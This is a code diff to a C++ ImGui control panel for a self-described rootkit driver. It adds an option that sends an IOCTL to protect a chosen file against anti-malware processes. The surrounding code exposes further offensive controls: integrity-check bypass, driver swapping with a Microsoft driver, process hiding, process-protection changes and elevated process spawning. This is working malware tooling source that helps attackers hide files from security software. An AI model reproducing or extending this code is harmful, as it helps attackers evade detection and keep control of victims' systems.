@@ -141,8 +141,8 @@ Texture readTextureFile()
 #define RESTRICT_ACCESS_TO_FILE_CTL             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x169, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define BYPASS_INTEGRITY_FILE_CTL               CTL_CODE(FILE_DEVICE_UNKNOWN, 0x170, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define ZWSWAPCERT_CTL                          CTL_CODE(FILE_DEVICE_UNKNOWN, 0x171, METHOD_BUFFERED, FILE_ANY_ACCESS)
-
 #define CR_SET_PROTECTION_LEVEL_CTL             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x172, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define PROTECT_FILE_AGAINST_ANTI_MALWARE_CTL   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x173, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 // Fixed type definitions
 #define STATUS_ALREADY_EXISTS ((DWORD)0xB7)
@@ -324,6 +324,7 @@ int main(int, char**)
     bool unprotect_all_processes = false;
     bool restrict_access_to_file = false;
     bool spoof_file = false;
+    bool protect_file_against_anti_malware = false;
     bool zwswapcert = false;
     bool hide_specific_process = false;
     bool spawn_elevated_process = false;
@@ -454,6 +455,8 @@ int main(int, char**)
                 ImGui::Checkbox("Change Process Protection", &unprotect_all_processes);
             }
 
+            //protect_file_against_anti_malware
+            ImGui::Checkbox("Protect the file against anti-malware processes", &protect_file_against_anti_malware);
             ImGui::Checkbox("Restrict Access To File", &restrict_access_to_file);
             ImGui::Checkbox("Bypass the file integrity check and protect it against anti-malware", &spoof_file);
             ImGui::Checkbox("Swap driver on disk and memory with a Microsoft driver", &zwswapcert);
@@ -664,9 +667,10 @@ int main(int, char**)
 
         if (restrict_access_to_file) {
             ImGui::SetNextWindowSize(ImVec2(400, 300), ImGuiCond_FirstUseEver);
-            if (spoof_file) {
+            if (spoof_file || protect_file_against_anti_malware) {
                 MessageBoxA(0, "You can only enable either restrict access to files or integrity bypass at a time.", "Warning", MB_OK);
                 spoof_file = false;
+                protect_file_against_anti_malware = false;
             }
 
             fopera operation_client = { 0 };
@@ -741,9 +745,10 @@ int main(int, char**)
 
         if (spoof_file) {
             ImGui::SetNextWindowSize(ImVec2(400, 300), ImGuiCond_FirstUseEver);
-            if (restrict_access_to_file) {
+            if (restrict_access_to_file | protect_file_against_anti_malware) {
                 MessageBoxA(0, "You can only enable either restrict access to files or integrity bypass at a time.", "Warning", MB_OK);
                 restrict_access_to_file = false;
+                protect_file_against_anti_malware = false;
             }
 
             fopera operation_client = { 0 };
@@ -796,7 +801,7 @@ int main(int, char**)
                         ImGui::Text("Hook already installed with the same config (duplicated structure)");
                     }
                     else {
-                        ImGui::Text("Failed to send IOCTL. Please make sure to provide a filename.");
+                        ImGui::Text("Failed to send IOCTL, Please make sure to provide a filename and you are connected to the rootkit.");
                     }
                     ImGui::PopStyleColor();
                 }
@@ -813,6 +818,79 @@ int main(int, char**)
             ImGui::End();
         }
 
+        if (protect_file_against_anti_malware) {
+            ImGui::SetNextWindowSize(ImVec2(400, 300), ImGuiCond_FirstUseEver);
+            if (restrict_access_to_file) {
+                MessageBoxA(0, "You can only enable either restrict access to files or integrity bypass at a time.", "Warning", MB_OK);
+                restrict_access_to_file = false;
+            }
+
+            fopera operation_client = { 0 };
+            ImGui::Begin("protect file against anti malware", &protect_file_against_anti_malware);
+            ImGui::InputTextWithHint("##fileToProtect", "Filename", filename, IM_ARRAYSIZE(filename));
+
+            if (ImGui::Button("Protect file")) {
+                if (hdevice != INVALID_HANDLE_VALUE && strlen(filename) > 0) {
+                    size_t len = strlen(filename);
+                    if (len < MAX_PATH - 1) {
+                        if (mbstowcs_s(NULL, operation_client.filename, MAX_PATH, filename, len) == 0) {
+                            printf("Filename to bypass integrity check (%ls)\n", operation_client.filename);
+
+                            DWORD bytesReturned = 0;
+                            if (DeviceIoControl(hdevice, PROTECT_FILE_AGAINST_ANTI_MALWARE_CTL, (LPVOID)&operation_client,
+                                sizeof(operation_client), &bytesReturned, sizeof(bytesReturned),
+                                NULL, NULL)) {
+                                ui_state.spoof_state = 2; // Success
+                                ui_state.spoof_timer = ui_state.MESSAGE_TIME;
+                            }
+                            else {
+                                ui_state.spoof_state = 1; // Error
+                                ui_state.spoof_timer = ui_state.MESSAGE_TIME;
+                                lpBytesReturned = GetLastError();
+                            }
+                        }
+                        else {
+                            ui_state.spoof_state = 1; // Error
+                            ui_state.spoof_timer = ui_state.MESSAGE_TIME;
+                        }
+                    }
+                    else {
+                        ui_state.spoof_state = 1; // Error
+                        ui_state.spoof_timer = ui_state.MESSAGE_TIME;
+                    }
+                }
+                else {
+                    printf("Please make sure to provide filename\n");
+                    ui_state.spoof_state = 1; // Error
+                    ui_state.spoof_timer = ui_state.MESSAGE_TIME;
+                }
+            }
+
+            if (ui_state.spoof_timer > 0.0f) {
+                ui_state.spoof_timer -= io.DeltaTime;
+
+                if (ui_state.spoof_state == 1) { // Error
+                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); // RED
+                    if (lpBytesReturned == STATUS_ALREADY_EXISTS) {
+                        ImGui::Text("Hook already installed with the same config (duplicated structure)");
+                    }
+                    else {
+                        ImGui::Text("Failed to send IOCTL, Please make sure to provide a filename and you are connected to the rootkit.");
+                    }
+                    ImGui::PopStyleColor();
+                }
+                else if (ui_state.spoof_state == 2) { // Success
+                    ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f)); // GREEN
+                    ImGui::Text("IOCTL sent, File Protected against anti-mawlare");
+                    ImGui::PopStyleColor();
+                }
+
+                if (ui_state.spoof_timer <= 0.0f) {
+                    ui_state.spoof_state = 0; // Reset
+                }
+            }
+            ImGui::End();
+        }
         if (spawn_elevated_process) {
             ImGui::SetNextWindowSize(ImVec2(300, 300), ImGuiCond_FirstUseEver);
             ImGui::Begin("Spawn Elevated Process", &spawn_elevated_process);
